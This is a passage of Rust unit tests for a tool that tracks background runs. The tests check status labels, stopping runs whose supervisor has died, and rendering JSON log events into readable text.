        assert_eq!(status_label(&done, |_| false), "done");
        // Not yet picked up by its supervisor: no pid to judge by.
        let starting = record(dir.path(), "c", Status::Starting, None);
        assert_eq!(status_label(&starting, |_| false), "starting");

        let ids: Vec<String> = load_all(dir.path()).into_iter().map(|r| r.id).collect();
        assert_eq!(ids, ["c", "b", "a"]);
    }

    #[tokio::test]
    async fn stopping_a_run_with_a_dead_supervisor_records_it() {
        let dir = tempfile::tempdir().unwrap();
        record(dir.path(), "a", Status::Running, Some(7));
        let (run, stopped) = stop_in(&dir.path().join("a"), |_| false).await.unwrap();
        assert!(stopped);
        assert_eq!(run.status, Status::Stopped);
        assert_eq!(load(&dir.path().join("a")).unwrap().status, Status::Stopped);
        assert!(dir.path().join("a").join("stop").exists());

        // A finished run is left exactly as it was.
        record(dir.path(), "b", Status::Done, Some(7));
        let (run, stopped) = stop_in(&dir.path().join("b"), |_| true).await.unwrap();
        assert!(stopped);
        assert_eq!(run.status, Status::Done);
        assert!(!dir.path().join("b").join("stop").exists());
    }

    #[test]
    fn logs_render_the_readable_events() {
        assert_eq!(
            render(r#"{"type":"text_delta","text":"hi"}"#).as_deref(),
            Some("hi")
        );
        assert_eq!(
            render(r#"{"type":"bg","message":"committed abc"}"#).as_deref(),
            Some("\n[bg] committed abc\n")
        );
        assert!(render(r#"{"type":"usage","usage":{}}"#).is_none());
        assert_eq!(render("not json").as_deref(), Some("not json\n"));
    }
}
